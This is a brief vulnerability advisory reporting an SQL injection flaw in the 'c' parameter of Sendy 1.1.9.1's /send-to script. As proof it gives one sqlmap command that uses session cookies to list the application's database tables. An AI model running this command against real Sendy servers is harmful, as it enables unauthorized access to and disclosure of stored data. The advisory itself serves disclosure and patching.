Subject: Sendy 1.1.9.1 - SQL Injection Vulnerability

Sendy contains a flaw that may allow carrying out an SQL injection attack. The issue is due to the /send-to script not properly sanitizing user-supplied input to the "c" parameter. This may allow a remote attacker to inject or manipulate SQL queries in the back-end database, allowing for the manipulation or disclosure of arbitrary data.

Proofs:

# sqlmap -u 'http://server1/send-to?i=1&c=10' --cookie="version=1.1.9.1; PHPSESSID=[phpsessid value]; logged_in=[logged_in value]" -p c -D sendy --tables
